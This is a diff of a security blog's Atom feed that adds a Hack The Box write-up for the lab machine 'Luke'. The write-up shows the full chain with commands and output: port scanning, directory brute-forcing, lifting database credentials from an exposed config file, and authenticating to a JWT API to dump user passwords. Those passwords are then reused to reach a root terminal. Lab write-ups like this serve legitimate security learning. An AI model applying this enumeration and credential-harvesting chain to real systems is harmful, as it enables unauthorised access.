@@ -1,4 +1,274 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-09-07T15:20:50+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Bastion (Commando)</title><link href="https://0xrick.github.io/hack-the-box/bastion-2/" rel="alternate" type="text/html" title="Hack The Box - Bastion (Commando)" /><published>2019-09-07T00:00:00+02:00</published><updated>2019-09-07T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/bastion-2</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/bastion-2/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-09-14T15:26:14+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Luke</title><link href="https://0xrick.github.io/hack-the-box/luke/" rel="alternate" type="text/html" title="Hack The Box - Luke" /><published>2019-09-14T00:00:00+02:00</published><updated>2019-09-14T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/luke</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/luke/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;Hey guys today Luke retired and here’s my write-up about it. It was an easy machine, all you need to do is to enumerate well and you’ll find what you need. It’s a FreeBSD box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.137&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;luke.htb&lt;/code&gt;. Let’s jump right in !&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/0.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# nmap -sV -sT -sC -o nmapinitial luke.htb
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-13 12:57 EET
+Nmap scan report for luke.htb (10.10.10.137)
+Host is up (0.23s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.xx.xx
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session upload bandwidth limit
+|      No session download bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
+|_End of status
+22/tcp   open  ssh?
+80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 202.84 seconds
+root@kali:~/Desktop/HTB/boxes/luke# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt; We have &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on ports 80, 3000, 8000 and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;. From the &lt;code class=&quot;highlighter-rouge&quot;&gt;http-title&lt;/code&gt; we can see that on port 3000 there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt; application and &lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti Administration Panel&lt;/code&gt; on port 8000. But before checking the web services let’s take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt;.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;ftp&quot;&gt;FTP&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;Anonymous login was allowed, there was only one directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;webapp&lt;/code&gt; which had a text file called &lt;code class=&quot;highlighter-rouge&quot;&gt;for_Chihiro.txt&lt;/code&gt; :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# ftp luke.htb
+Connected to luke.htb.
+220 vsFTPd 3.0.3+ (ext.1) ready...
+Name (luke.htb:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls 
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+226 Directory send OK.
+ftp&amp;gt; cd webapp
+250 Directory successfully changed.
+ftp&amp;gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
+226 Directory send OK.
+ftp&amp;gt; get for_Chihiro.txt
+local: for_Chihiro.txt remote: for_Chihiro.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).
+226 Transfer complete.
+306 bytes received in 0.00 secs (236.0412 kB/s)
+ftp&amp;gt; 221 Goodbye.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;for_Chihiro.txt&lt;/code&gt; :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dear Chihiro !!
+
+As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
+the actual website I've created .
+Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 
+
+Derry  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;From this note we get two potential usernames : &lt;code class=&quot;highlighter-rouge&quot;&gt;Chihiro&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Derry&lt;/code&gt;.
+&lt;br /&gt;Also, now we know that we can find some source files somewhere, let’s check out the web services.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-enumeration-user-and-root-flags&quot;&gt;Web Enumeration, User and Root Flags&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;On port 80 there was this simple website :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/1.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;Nothing was really interesting so I bruteforced directories and pages with &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# wfuzz -c --hc 404 -u http://luke.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt  
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://luke.htb/FUZZ
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000011:  C=403      9 L       24 W          213 Ch        &quot;.hta&quot;
+000001:  C=200    108 L      240 W         3138 Ch        &quot;&quot;
+000012:  C=403      9 L       24 W          218 Ch        &quot;.htaccess&quot;
+000013:  C=403      9 L       24 W          218 Ch        &quot;.htpasswd&quot;
+001114:  C=301      7 L       20 W          228 Ch        &quot;css&quot;
+002020:  C=200    108 L      240 W         3138 Ch        &quot;index.html&quot;
+002179:  C=301      7 L       20 W          227 Ch        &quot;js&quot;
+002282:  C=200     21 L      172 W         1093 Ch        &quot;LICENSE&quot;
+002435:  C=401     12 L       46 W          381 Ch        &quot;management&quot;
+002485:  C=301      7 L       20 W          231 Ch        &quot;member&quot;
+004286:  C=301      7 L       20 W          231 Ch        &quot;vendor&quot;
+
+Total time: 116.3713
+Processed Requests: 4614
+Filtered Requests: 4603
+Requests/sec.: 39.64892
+
+root@kali:~/Desktop/HTB/boxes/luke# wfuzz -c --hc 404 -u http://luke.htb/FUZZ.php -w /usr/share/wordlists/dirb/common.txt                                                                                         
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                                         
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://luke.htb/FUZZ.php
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload
+==================================================================
+
+000011:  C=403      9 L       24 W          217 Ch        &quot;.hta&quot;
+000012:  C=403      9 L       24 W          222 Ch        &quot;.htaccess&quot;
+000013:  C=403      9 L       24 W          222 Ch        &quot;.htpasswd&quot;
+000994:  C=200      6 L       25 W          202 Ch        &quot;config&quot;
+002347:  C=200     39 L      118 W         1593 Ch        &quot;login&quot;
+
+Total time: 140.0363
+Processed Requests: 4614
+Filtered Requests: 4609
+Requests/sec.: 32.94859
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;/management&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/member&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/login.php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/config.php&lt;/code&gt;. I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;config.php&lt;/code&gt; first :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = &quot;login&quot;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&quot;Connect failed: %s\n&quot;. $conn -&amp;gt; error); 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Great, we got database credentials, I tried to &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; into the box with them but it didn’t work.
+&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/login.php&lt;/code&gt; :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;Also the credentials didn’t work here.
+&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/management&lt;/code&gt; :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;It uses &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; basic authentication, I tried to login but again the credentials didn’t work.
+&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/member&lt;/code&gt; was just empty :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/6.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;On port 8080 there was &lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Ajenti: An admin’s tool for a more civilized age, providing you with a fast and secure way to manage a remote Linux box at any time using everyday tools like a web terminal, text editor, file manager and others. -&lt;a href=&quot;http://ajenti.org/&quot;&gt;ajenti.org&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; provides a terminal, so if we could access &lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; then we got a shell. However, the credentials didn’t work here too :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/8.png&quot; alt=&quot;&quot; /&gt;
+The only thing left is the &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt; application, which uses &lt;code class=&quot;highlighter-rouge&quot;&gt;JWT&lt;/code&gt; tokens for authentication :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# curl http://luke.htb:3000/
+{&quot;success&quot;:false,&quot;message&quot;:&quot;Auth token is not supplied&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I googled that error message and found this article on medium : &lt;a href=&quot;https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4&quot;&gt;A guide for adding JWT token-based authentication to your single page Node.js applications&lt;/a&gt;. 
+&lt;br /&gt;I fuzzed the application to verify that the endpoint &lt;code class=&quot;highlighter-rouge&quot;&gt;/login&lt;/code&gt; exists :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# wfuzz -c --hc 404 -u http://luke.htb:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://luke.htb:3000/FUZZ
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000001:  C=200      0 L        5 W           56 Ch        &quot;&quot;
+002347:  C=200      0 L        2 W           13 Ch        &quot;login&quot;
+002348:  C=200      0 L        2 W           13 Ch        &quot;Login&quot;
+004245:  C=200      0 L        5 W           56 Ch        &quot;users&quot;
+
+Total time: 147.3540
+Processed Requests: 4614
+Filtered Requests: 4610
+Requests/sec.: 31.31234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/login&lt;/code&gt; exists and there’s also another endpoint called &lt;code class=&quot;highlighter-rouge&quot;&gt;/users&lt;/code&gt; which can’t be accessed without authentication too :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# curl http://luke.htb:3000/users
+{&quot;success&quot;:false,&quot;message&quot;:&quot;Auth token is not supplied&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I tried to login with the credentials but it failed :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# curl --header &quot;Content-Type: application/json&quot; --request POST --data '{&quot;password&quot;:&quot;Zk6heYCyv6ZE9Xcg&quot;,&quot;username&quot;:&quot;root&quot;}' http://luke.htb:3000/login 
+Forbidden
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;So I tried the same username from the article (&lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;) instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; and it worked :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali:~/Desktop/HTB/boxes/luke# curl --header &quot;Content-Type: application/json&quot; --request POST --data '{&quot;password&quot;:&quot;Zk6heYCyv6ZE9Xcg&quot;,&quot;username&quot;:&quot;admin&quot;}' http://luke.htb:3000/login 
+{&quot;success&quot;:true,&quot;message&quot;:&quot;Authentication successful!&quot;,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzczNjA0LCJleHAiOjE1Njg0NjAwMDR9.Xt854IyFtvP4nQbQa_l63hIJ3aewfVT98gqz5gfU5Us&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Now we can access the application with our token :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzczNjA0LCJleHAiOjE1Njg0NjAwMDR9.Xt854IyFtvP4nQbQa_l63hIJ3aewfVT98gqz5gfU5Us' http://luke.htb:3000/
+{&quot;message&quot;:&quot;Welcome admin ! &quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/users&lt;/code&gt; returned a list of these users :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzczNjA0LCJleHAiOjE1Njg0NjAwMDR9.Xt854IyFtvP4nQbQa_l63hIJ3aewfVT98gqz5gfU5Us' http://luke.htb:3000/users
+[{&quot;ID&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Admin&quot;,&quot;Role&quot;:&quot;Superuser&quot;},{&quot;ID&quot;:&quot;2&quot;,&quot;name&quot;:&quot;Derry&quot;,&quot;Role&quot;:&quot;Web Admin&quot;},{&quot;ID&quot;:&quot;3&quot;,&quot;name&quot;:&quot;Yuri&quot;,&quot;Role&quot;:&quot;Beta Tester&quot;},{&quot;ID&quot;:&quot;4&quot;,&quot;name&quot;:&quot;Dory&quot;,&quot;Role&quot;:&quot;Supporter&quot;}]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;After trying different things, &lt;code class=&quot;highlighter-rouge&quot;&gt;/users/username&lt;/code&gt; revealed more info about each user :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzczNjA0LCJleHAiOjE1Njg0NjAwMDR9.Xt854IyFtvP4nQbQa_l63hIJ3aewfVT98gqz5gfU5Us' http://luke.htb:3000/users/admin
+{&quot;name&quot;:&quot;Admin&quot;,&quot;password&quot;:&quot;WX5b7)&amp;gt;/rp$U)FW&quot;}
+
+root@kali:~/Desktop/HTB/boxes/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzczNjA0LCJleHAiOjE1Njg0NjAwMDR9.Xt854IyFtvP4nQbQa_l63hIJ3aewfVT98gqz5gfU5Us' http://luke.htb:3000/users/derry
+{&quot;name&quot;:&quot;Derry&quot;,&quot;password&quot;:&quot;rZ86wwLvx7jUxtch&quot;}
+
+root@kali:~/Desktop/HTB/boxes/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzczNjA0LCJleHAiOjE1Njg0NjAwMDR9.Xt854IyFtvP4nQbQa_l63hIJ3aewfVT98gqz5gfU5Us' http://luke.htb:3000/users/yuri
+{&quot;name&quot;:&quot;Yuri&quot;,&quot;password&quot;:&quot;bet@tester87&quot;}
+
+root@kali:~/Desktop/HTB/boxes/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzczNjA0LCJleHAiOjE1Njg0NjAwMDR9.Xt854IyFtvP4nQbQa_l63hIJ3aewfVT98gqz5gfU5Us' http://luke.htb:3000/users/dory
+{&quot;name&quot;:&quot;Dory&quot;,&quot;password&quot;:&quot;5y:!xa=ybfe)/QD&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;After trying these credentials everywhere, I could login to &lt;code class=&quot;highlighter-rouge&quot;&gt;/management&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;Derry&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/9.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/10.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;These are the source files &lt;code class=&quot;highlighter-rouge&quot;&gt;Derry&lt;/code&gt; was talking about in the note we got from the &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; server. In &lt;code class=&quot;highlighter-rouge&quot;&gt;config.json&lt;/code&gt; I found some stuff related to &lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; and I found the password for the user &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/11.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/12.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/13.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;Now we can start a terminal as &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; and get the flags :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/luke/14.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;And we owned root.
+&lt;br /&gt;That’s it , Feedback is appreciated !
+&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
+&lt;br /&gt;Thanks for reading.
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bastion/&quot;&gt;Hack The Box - Bastion&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="bsd" /><category term="web" /><summary type="html">Quick Summary Hey guys today Luke retired and here’s my write-up about it. It was an easy machine, all you need to do is to enumerate well and you’ll find what you need. It’s a FreeBSD box and its ip is 10.10.10.137, I added it to /etc/hosts as luke.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` root@kali:~/Desktop/HTB/boxes/luke# nmap -sV -sT -sC -o nmapinitial luke.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-13 12:57 EET Nmap scan report for luke.htb (10.10.10.137) Host is up (0.23s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) | ftp-anon: Anonymous FTP login allowed (FTP code 230) |drwxr-xr-x 2 0 0 512 Apr 14 12:35 webapp | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.xx.xx | Logged in as ftp | TYPE: ASCII | No session upload bandwidth limit | No session download bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3+ (ext.1) - secure, fast, stable |_End of status 22/tcp open ssh? 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) | http-methods: | Potentially risky methods: TRACE |_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 |_http-title: Luke 3000/tcp open http Node.js Express framework |_http-title: Site doesn’t have a title (application/json; charset=utf-8). 8000/tcp open http Ajenti http control panel |_http-title: Ajenti</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/luke/0.png" /></entry><entry><title type="html">Hack The Box - Bastion (Commando)</title><link href="https://0xrick.github.io/hack-the-box/bastion-2/" rel="alternate" type="text/html" title="Hack The Box - Bastion (Commando)" /><published>2019-09-07T00:00:00+02:00</published><updated>2019-09-07T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/bastion-2</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/bastion-2/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
 &lt;p&gt;&lt;br /&gt;Hey guys, this is my second post for Bastion, in the &lt;a href=&quot;/hack-the-box/bastion&quot;&gt;first post&lt;/a&gt; I solved it with kali, in this one I will solve it with CommandoVM. Bastion’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.134&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;bastion.htb&lt;/code&gt;. Let’s jump right in !
@@ -213,6 +483,7 @@ C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;
 &lt;br /&gt;
 &lt;br /&gt;
 &lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/onetwoseven/&quot;&gt;Hack The Box - OneTwoSeven&lt;/a&gt;
+&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/luke/&quot;&gt;Hack The Box - Luke&lt;/a&gt;
 &lt;br /&gt;First post : &lt;a href=&quot;/hack-the-box/bastion/&quot;&gt;Hack The Box - Bastion&lt;/a&gt;&lt;/p&gt;
